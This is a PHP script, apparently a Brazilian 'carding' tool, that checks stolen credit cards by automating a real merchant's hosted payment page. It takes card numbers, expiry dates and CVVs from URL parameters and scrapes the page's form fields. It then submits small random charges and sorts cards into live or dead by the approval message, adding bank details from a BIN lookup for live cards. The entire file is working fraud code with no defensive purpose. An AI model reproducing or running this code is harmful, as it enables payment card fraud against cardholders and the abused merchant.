<?php

error_reporting(0);
set_time_limit(0);

/* 
************************************
API 1.1 CARDING NETWORK            *
CRIADO: 14/10/2018                 *
ATUALIZADO: 14/10/2018             *
EDITADO: 19/10/2018 POR @Th1a6o    *
TIPO: FULL / GRINGA                *
FONTE: BPOINT / BILLER             *
                                   *
                                   *
POR:                               *
JOHN KAI$3R AND BO$$CODER          *
************************************
*/

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// FUNCTIONS //

function regex($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

$nomes = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);

class Request {

	function curlRequest($method, $data, $cooke){

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://www.ippayments.com.au/access/index.aspx?a=85204931&dl=standardhpp_hpp_purchase");
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		if ($method == 'POST'):
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		elseif($method == 'GET'):
			curl_setopt($ch, CURLOPT_HTTPGET, 1);
		else:
			exit('informe methodo corretamente');
		endif;
		$headers = array();
		$headers[] = 'Host: www.ippayments.com.au';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0';
		$headers[] = 'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'Referer: https://www.ippayments.com.au/access/index.aspx?a=85204931&dl=standardhpp_hpp_purchase';
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Upgrade-Insecure-Requests: 1';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cooke.".txt");
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cooke.".txt");
		return curl_exec($ch);

	}

	function get($cooke) {
		return $this->curlRequest('GET', NULL ,$cooke);
	}

	function post($data, $cooke) {
		return $this->curlRequest('POST', $data, $cooke);
	}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// VALIDATION INPUT FORM //

if(isset($_GET['cc']) AND isset($_GET['deli']) AND strrpos($_GET['cc'], $_GET['deli']) AND (count($cc = explode($_GET['deli'], $_GET['cc'])) - 1) == 3 ){
	foreach($cc as $i): (empty($i) ? exit(json_encode(array('status'=>3,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>INVALID</td></tr>'))) : null); endforeach;
	//'{"resultado":"DIE","retorno":"<span class=\"label btn_6 label-danger\">#DIE ✘</span> <span class=\"label label-warning\">'.$_GET['cc'].' INVALID</span>"}'

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// TOKEN REQUEST 0 AND CONFIG //

	((strlen($cc[2]) == 2) ? $cc[2] = '20'.$cc[2] : NULL);
	$cooke = rand(000000, 999999);
	$saldo = rand(5,9).'.'.rand(00,99);
	$a = new Request();
	$result0 = $a->get($cooke);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/* REGEX PARSER 0 */

	$view0 = urlencode(regex($result0, '__VIEWSTATE" value="','"'));
	$vgenerator0 = regex($result0, '__VIEWSTATEGENERATOR" value="', '"');
	$validation0 = urlencode(regex($result0, '__EVENTVALIDATION" value="', '"'));
        ///////////////////////////////////////////////////////////////
	$input0 = regex($result0, '>Reference</label>', '</span>');
	$biller = regex($input0, '<input name="ctrl', '" type="text" id="');        
        ///////////////////////////////////////////////////////////////
	$input1 = regex($result0, '>Amount</label>', '</span>'); 
	$valor = regex($input1, '<input name="ctrl', '" type="text" id="');
        ///////////////////////////////////////////////////////////////
	$input2 = regex($result0, '>Cardholder Name</label>', '</span>'); 
	$Anome = regex($input2, '<input name="ctrl', '" type="text" id="');
        ///////////////////////////////////////////////////////////////
	$input3 = regex($result0, '>Card Number</label>', '</span>');
	$Anumero = regex($input3, '<input name="ctrl', '" type="text" id="');
        ///////////////////////////////////////////////////////////////
	$input4 = regex($result0, '>Expiry Date</label>', '">Month</option');
	$Ames = regex($input4, '<select name="ctrl', '" id="');
        ///////////////////////////////////////////////////////////////
	$input5 = regex($result0, '/select>', '">Year</option'); 
	$Aano = regex($input5, '<select name="ctrl', '" id="');
        ///////////////////////////////////////////////////////////////
	$input6 = regex($result0, '>Security Code</label>', '</span>');
	$Acvv = regex($input6, '<input name="ctrl', '" type="text" id="');
        ///////////////////////////////////////////////////////////////
	$input7 = regex($result0, 'Pay Now</button>', '/><input id="'); 
	$notok = regex($input7, '<input type="submit" name="ctrl', '" value="');
        ///////////////////////////////////////////////////////////////
	$input8 = regex($result0, 'Pay Now</button>', '</div>'); 
	$zorz = regex($input8, 'type="checkbox" name="ctrl', '" checked="checked');
        ///////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/* DATA FOR REQUEST 1 */

	$data0 = '__VIEWSTATE='.$view0.'&__VIEWSTATEGENERATOR='.$vgenerator0.'&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION='.$validation0.'&ctrl'.$biller.'=85204931&ctrl'.$valor.'='.$saldo.'&ctrl'.$Anome.'='.$nomes.'+'.$nomes.'+'.$nomes.'&ctrl'.$Anumero.'='.$cc[0].'&ctrl'.$Ames.'='.$cc[1].'&ctrl'.$Aano.'='.$cc[2].'&ctrl'.$Acvv.'='.$cc[3].'&ctrl'.$notok.'=&ctrl'.$zorz.'=on';

         /*
              // DEBUG POST MODE = OFF //
                 echo "<pre>";
                 print_r(explode('&', $data0));
                                                      */

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// REQUEST 1 //

                 $result1 = $a->post($data0, $cooke);       
                 ((strrpos($result1, 'You must enter a valid credit card number')) ? exit(json_encode(array('status'=>3,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>INVALID CARD</td></tr>'))) : NULL);
                 //'{"resultado":"DIE","retorno":"<span class=\"label btn_6 label-danger\">#DIE ✘</span> <span class=\"label label-warning\">'.$_GET['cc'].' INVALID</span>"}'
                 ((strrpos($result1, 'DebitCard is not accepted. Please try another credit card')) ? exit(json_encode(array('status'=>3,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>DEBIT CARD NOT ACCEPTED</td></tr>'))) : NULL);
                 //'{"resultado":"DIE","retorno":"<span class=\"label btn_6 label-danger\">#DIE ✘</span> <span class=\"label label-warning\">'.$_GET['cc'].' DEBIT-INVALID</span>"}'

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

                 /* REGEX PARSER 1 */

                 $view1 = urlencode(regex($result1, '" id="__VIEWSTATE" value="', '"'));
                 $vgenerator1 = regex($result1, '__VIEWSTATEGENERATOR" value="', '"');
                 $validation1 = urlencode(regex($result1, '__EVENTVALIDATION" value="', '"'));
                 $inputA0 = regex($result1, '">Cancel</button', 'ubmitbtn" style="display:none;" /><input type="submit'); 
                 $zorz1 = regex($inputA0, '"submit" name="ctrl', '" value="" id="');

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

                 /* DATA FOR REQUEST 2 */

                 $data1 = '__VIEWSTATE='.$view1.'&__VIEWSTATEGENERATOR='.$vgenerator1.'&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION='.$validation1.'&ctrl'.$zorz1.'=';

                /*
                     // DEBUG POST MODE = OFF //
                        echo "<pre>";
                        print_r(explode('&', $data1));
                                                            */

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// REQUEST 2 //

                        $result2 = $a->post($data1, $cooke);

                        if(strrpos($result2, 'Your payment result is:<span class="result">APPROVED')):
                        	$bin = json_decode(file_get_contents('https://lookup.binlist.net/'.substr($_GET['cc'],0,6)));
                        	exit(json_encode(array('status'=>1,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>R$ '.$saldo.'</td><td>'.$bin->country->name.'</td><td>'.$bin->country->currency.'</td><td>'.$bin->bank->name.'</td><td>'.strtoupper($bin->scheme).'</td><td>'.strtoupper($bin->brand).'</td><td>'.strtoupper($bin->type).'</td></tr>')));
                        	//'{"resultado":"LIVE","retorno":"<span class=\"label btn_6 label-success\">#LIVE ✔</span> <span class=\"label label-primary\">'.$_GET['cc'].'</span> | <span class=\"label btn_6 label-success\">DEBITOU:</span> <span class=\"label btn_6 label-info\">[R$'.$saldo.']</span> | <span class=\"label btn_6 label-primary\">'.$binresult.'</span>"}'
                        elseif(strrpos($result2, 'Your payment result is:<span class="result">DECLINED')):
                        	exit(json_encode(array('status'=>0,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>R$ '.$saldo.'</td></tr>')));
                        	//'{"resultado":"DIE","retorno":"<span class=\"label btn_6 label-danger\">#DIE ✘</span> <span class=\"label label-warning\">'.$_GET['cc'].'</span>"}'
                        elseif(strpos($result2, 'The expiry date you have entered appears invalid')):
                        	exit(json_encode(array('status'=>0,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>INVALID DATE CARD</td></tr>')));
                        	//'{"resultado":"DIE","retorno":"<span class=\"label btn_6 label-danger\">#DIE ✘</span> <span class=\"label label-warning\">'.$_GET['cc'].'</span>"}'
                        else:
                        	exit(json_encode(array('status'=>3,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>N/D</td></tr>')));
                        	//'{"resultado":"DIE","retorno":"<span class=\"label btn_6 label-danger\">#DIE ✘</span> <span class=\"label label-warning\">'.$_GET['cc'].' ERROR</span>"}'
                        endif;

                    }else{
                    	exit(json_encode(array('status'=>3,'str'=>'<tr><td>'.$cc[0].'</td><td>'.$cc[1].'</td><td>'.$cc[2].'</td><td>'.$cc[3].'</td><td>PARAMETROS NÂO INSERIDOS</td></tr>')));
                    }